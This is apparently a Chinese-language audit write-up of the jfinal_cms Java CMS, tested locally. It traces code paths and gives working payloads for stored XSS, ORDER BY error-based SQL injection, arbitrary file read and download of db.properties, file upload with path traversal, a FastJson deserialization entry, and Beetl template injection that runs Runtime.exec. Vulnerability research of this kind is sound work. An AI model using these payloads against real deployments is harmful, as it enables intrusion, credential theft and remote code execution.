# XSS

无非就是用户输入与数据回显到页面，在审计时先从网站里找到可能存在xss漏洞的功能点，再抓包分析路由跟到代码里，找到对应的位置。先看java引入的模版引擎是否可能存在xss，再分析在接受数据与数据回显到页面的过程中是否有相关过滤

这里的模版引擎为 `beetl` ，默认不会过滤 xss

```
<dependency>
 <groupId>com.ibeetl</groupId>
 <artifactId>beetl</artifactId>
 <version>${beetl.version}</version>
</dependency>
```

## 寻找功能点

在前台注册账号后登录，会员中心里有修改信息的功能点

<img src=".\图片\Snipaste_2023-10-26_12-04-29.png" alt="Snipaste_2023-10-26_12-04-29" style="zoom:80%;" />

这里存在用户输入与数据回显

## 代码分析

### 起点controller

根据请求包找到路由，在`com/jflyfox/modules/front/controller/PersonController.java` 里的 `save()` 方法里

```java
/**
	 * 个人信息保存
	 */
	public void save() {
		JSONObject json = new JSONObject();
		json.put("status", 2);// 失败

		SysUser user = (SysUser) getSessionUser();
		int userid = user.getInt("userid");
		SysUser model = getModel(SysUser.class);

		if (userid != model.getInt("userid")) {
			json.put("msg", "提交数据错误！");
			renderJson(json.toJSONString());
			return;
		}

		// 第三方用户不需要密码
		if (user.getInt("usertype") != 4) {
			String oldPassword = getPara("old_password");
			String newPassword = getPara("new_password");
			String newPassword2 = getPara("new_password2");
			if (!user.getStr("password").equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) {
				json.put("msg", "密码错误！");
				renderJson(json.toJSONString());
				return;
			}
			if (StrUtils.isNotEmpty(newPassword) && !newPassword.equals(newPassword2)) {
				json.put("msg", "两次新密码不一致！");
				renderJson(json.toJSONString());
				return;
			} else if (StrUtils.isNotEmpty(newPassword)) { // 输入密码并且一直
				model.set("password", JFlyFoxUtils.passwordEncrypt(newPassword));
			}
		}

		if (StrUtils.isNotEmpty(model.getStr("email")) && model.getStr("email").indexOf("@") < 0) {
			json.put("msg", "email格式错误！");
			renderJson(json.toJSONString());
			return;
		}

		model.update(); //把数据更新到web页面，要过滤xss的话可能会在这里过滤，但是跟进之后没有发现过滤
		UserCache.init(); // 设置缓存
		SysUser newUser = SysUser.dao.findById(userid);
		setSessionUser(newUser); // 设置session
		json.put("status", 1);// 成功

		renderJson(json.toJSONString());
	}
```

### 回显web页面

在 `src/main/webapp/template/bbs/includes/userinfo.html` 里是修改数据后的回显页面

定位关键输出（修改后的回显数据）

```html
<div class="col-md-9">
						<strong>${user.realname!''}</strong>
						<p style="word-break: break-all;word-wrap: break-word;">${user.remark!'这个家伙太懒了，暂无说明'}</p>
				  </div>
```

直接拼接

### xss复现

```
<script>alert('xss')</script>
```

<img src=".\图片\Snipaste_2023-10-26_12-20-39.png" alt="Snipaste_2023-10-26_12-20-39" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-10-26_12-21-15.png" alt="Snipaste_2023-10-26_12-21-15" style="zoom:67%;" />

# SQLI

## 漏洞代码

在 `com/jflyfox/modules/admin/article/ArticleController.java` 里的 `list()` 方法里

```java
public void list() {
		TbArticle model = getModelByAttr(TbArticle.class);

		SQLUtils sql = new SQLUtils(" from tb_article t " //
				+ " left join tb_folder f on f.id = t.folder_id " //
				+ " where 1 = 1 ");
		if (model.getAttrValues().length != 0) {
			sql.setAlias("t");
			sql.whereLike("title", model.getStr("title"));
			sql.whereEquals("folder_id", model.getInt("folder_id"));
			sql.whereEquals("status", model.getInt("status"));
		}
		// 站点设置
		int siteId = getSessionUser().getBackSiteId();
		sql.append(" and site_id = " + siteId);

		// 排序
		String orderBy = getBaseForm().getOrderBy(); //接受用户输入
		if (StrUtils.isEmpty(orderBy)) {
			sql.append(" order by t.folder_id,t.sort,t.create_time desc ");
		} else {
			sql.append(" order by t.").append(orderBy); // sql 可控
		}

		Page<TbArticle> page = TbArticle.dao.paginate(getPaginator(), "select t.*,f.name as folderName ", //
				sql.toString().toString()); //拼接 sql ，漏洞成因  ，函数一路跟下去就是查询数据库然后返回

		// 查询下拉框
		setAttr("selectFolder", selectFolder(model.getInt("folder_id")));

		setAttr("page", page);
		setAttr("attr", model);

		setAttr("folders", new FolderService().getFolders(siteId));
		render(path + "list.html");
	}
```

跟踪 `dao.paginate()`，在 `com/jfinal/plugin/activerecord/Model.java` 里找到

```java
	private Page<M> doPaginate(int pageNumber, int pageSize, Boolean isGroupBySql, String select, String sqlExceptSelect, Object... paras) {
		Config config = _getConfig();
		Connection conn = null;
		try {
			conn = config.getConnection();
			String totalRowSql = "select count(*) " + config.dialect.replaceOrderBy(sqlExceptSelect);//这里是我们sql注入拼接的语句
			StringBuilder findSql = new StringBuilder();
			findSql.append(select).append(' ').append(sqlExceptSelect);
			return doPaginateByFullSql(config, conn, pageNumber, pageSize, isGroupBySql, totalRowSql, findSql, paras);
		} catch (Exception e) {
			throw new ActiveRecordException(e);
		} finally {
			config.close(conn);
		}
	}
```

## sql注入复现

```http
POST /jfinal_cms/admin/article/list HTTP/1.1
Host: localhost:8081
Content-Length: 192
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8081/jfinal_cms/admin/article/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=2A8D7998B7C59F5492D2A4C73856C696; Hm_lvt_1040d081eea13b44d84a4af639640d51=1698299324; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1698299343
Connection: close

form.orderColumn=and%20(extractvalue(1%2cconcat(0x7e%2c(select%20user())%2c0x7e)))%23&form.orderAsc=&attr.folder_id=-1&attr.title=j&attr.status=-1&totalRecords=9&pageNo=1&pageSize=20&length=10
```

<img src=".\图片\Snipaste_2023-10-26_13-57-53.png" alt="Snipaste_2023-10-26_13-57-53" style="zoom:67%;" />

报错注入

查看日志，报错注入拼接执行的 sql 为：

```sql
select count(*)  from tb_article t  left join tb_folder f on f.id = t.folder_id  where 1 = 1  AND t.title LIKE '%j%' and site_id = 9  and (extractvalue(1,concat(0x7e,(select user()),0x7e)))# null 
```

而正常使用功能的 sql 为：

```sql
select count(*)  from tb_article t  left join tb_folder f on f.id = t.folder_id  where 1 = 1  AND t.title LIKE '%j%' and site_id = 9
```

其实如果不太清楚 sql 语句的执行的话，还可以println() 打印 sql 语句到控制台查看



而 所有调⽤ `getBaseForm().getOrderBy();` 均可能存在注⼊



# 任意文件上传

功能点在 http://localhost:8081/jfinal_cms/admin/filemanager/list

代码在 `com/jflyfox/modules/filemanager/FileManagerController.java`

查看后也是没有经过过滤

已经上传成功，但是无法访问，因为 web.xml 里限制了 jsp 后缀，如果是 jsp 和 jspx 都返回 404 ⻚⾯

<img src=".\图片\Snipaste_2023-10-26_14-32-18.png" alt="Snipaste_2023-10-26_14-32-18" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-10-26_14-32-54.png" alt="Snipaste_2023-10-26_14-32-54" style="zoom:67%;" />



而且存在上传文件目录穿越，上传目录可控

<img src=".\图片\Snipaste_2023-10-26_14-37-31.png" alt="Snipaste_2023-10-26_14-37-31" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-10-26_14-35-45.png" alt="Snipaste_2023-10-26_14-35-45" style="zoom:67%;" />

```
../jfinal_cms/upload/
```



# FastJson反序列化

版本 `1.2.62`

```xml
<!-- fastjson -->
		<fastjson.version>1.2.62</fastjson.version>
```

搜索关键字

<img src=".\图片\Snipaste_2023-10-26_14-47-08.png" alt="Snipaste_2023-10-26_14-47-08" style="zoom:67%;" />

## 前台

在 `com/jflyfox/api/form/ApiForm.java` 里找到

```java
private JSONObject getParams() {
		JSONObject json = null;
		try {
			String params = "";
			params = this.p;
			boolean flag = ConfigCache.getValueToBoolean("API.PARAM.ENCRYPT");
			if (flag) {
				params = ApiUtils.decode(params);
			}

			json = JSON.parseObject(params);// 反序列化
		} catch (Exception e) {
			log.error("apiform json parse fail:" + p);
			return new JSONObject();
		}

		return json;
	}
```

再寻找调用了 `ApiForm` 类的其它类，发现 `ApiController.java`

<img src=".\图片\Snipaste_2023-10-26_15-02-36.png" alt="Snipaste_2023-10-26_15-02-36" style="zoom:60%;" />

接下来看如何找到正确路由，触发反序列化，这里可以参考 cms 里的 api 文档

<img src=".\图片\Snipaste_2023-10-26_15-10-30.png" alt="Snipaste_2023-10-26_15-10-30" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-10-26_15-10-45.png" alt="Snipaste_2023-10-26_15-10-45" style="zoom:67%;" />



# 任意文件读取

漏洞代码在 `src/main/java/com/jflyfox/modules/filemanager/FileManager.java`

```java
public JSONObject editFile() {
        JSONObject array = new JSONObject();

        // 读取文件信息
        try {
            String content = FileManagerUtils.readString(getRealFilePath());

            content = FileManagerUtils.encodeContent(content);

            array.put("Path", this.get.get("path"));
            array.put("Content", content);
            array.put("Error", "");
            array.put("Code", 0);
        } catch (JSONException e) {
            this.error("JSONObject error");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return array;
    }
```

一路跟进，不存在过滤

```java
public static String readString(String path) throws IOException {
		byte[] content = FileUtils.read(path);
		return content == null ? "" : new String(content, ENCODE);
	}
```

这时候不好从代码里找到路由的话，那就从web功能点寻找，要有手感，大约是文件操作里的编辑文件之类的。

从功能点找到触发任意文件读取的链接

<img src=".\图片\Snipaste_2023-10-26_15-34-34.png" alt="Snipaste_2023-10-26_15-34-34" style="zoom:80%;" />

```http
http://localhost:8081/jfinal_cms/admin/filemanager?mode=editfile&path=/jfinal_cms/login.html&config=filemanager.config.js&time=314
```

触发：

```http
http://localhost:8081/jfinal_cms/admin/filemanager?mode=editfile&path=/web-inf/classes/conf/db.properties&config=filemanager.config.js&time=314
```

<img src=".\图片\Snipaste_2023-10-26_15-36-25.png" alt="Snipaste_2023-10-26_15-36-25" style="zoom:80%;" />

# 任意文件下载

与任意文件读取类似，漏洞代码在 `src/main/java/com/jflyfox/modules/filemanager/FileManager.java`

```java
public void download(HttpServletResponse resp) {
        File file = new File(getRealFilePath());
        if (this.get.get("path") != null && file.exists()) {
            resp.setHeader("Content-type", "application/force-download");
            resp.setHeader("Content-Disposition", "inline;filename=\"" + fileRoot + this.get.get("path") + "\"");
            resp.setHeader("Content-Transfer-Encoding", "Binary");
            resp.setHeader("Content-length", "" + file.length());
            resp.setHeader("Content-Type", "application/octet-stream");
            resp.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            readFile(resp, file);
        } else {
            this.error(sprintf(lang("FILE_DOES_NOT_EXIST"), this.get.get("path")));
        }
    }
```

触发

```http
http://localhost:8081/jfinal_cms/admin/filemanager?mode=download&path=/web-inf/classes/conf/db.properties&config=filemanager.config.js&time=314
```

# SSTI模板注⼊

在 jfinalcms 模板使⽤的是 beetl，在后台提供修改模块的功能

<img src=".\图片\Snipaste_2023-10-26_15-40-18.png" alt="Snipaste_2023-10-26_15-40-18" style="zoom:67%;" />

可以全网搜索文章，再测试

```
${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}
```

<img src=".\图片\Snipaste_2023-10-26_15-45-58.png" alt="Snipaste_2023-10-26_15-45-58" style="zoom:67%;" />

弹出计算器

<img src=".\图片\Snipaste_2023-10-26_15-46-17.png" alt="Snipaste_2023-10-26_15-46-17" style="zoom:67%;" />



